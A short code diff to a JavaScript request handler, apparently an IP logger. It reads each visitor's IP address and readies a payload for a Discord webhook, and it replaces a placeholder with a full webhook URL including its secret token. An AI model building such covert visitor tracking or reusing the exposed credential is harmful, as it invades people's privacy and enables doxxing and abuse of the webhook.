@@ -2,8 +2,8 @@ export default async function handler(req, res) {
     // 相手のIPを取得
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
-    // Discord WebhookのURL（ここに自分のを貼る）
-    const webhookUrl = 'ここに自分のWebhookURLを貼る';
+    // あなたのWebhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/1484231896249667674/HFXSRPZuRk3AKqutLlGKEmxf_rXlldoebi6hm5P2uEeIzXJtqVLX_kHYJ88TCTQQaAJg';
 
     // Discordに送信する内容
     const payload = {
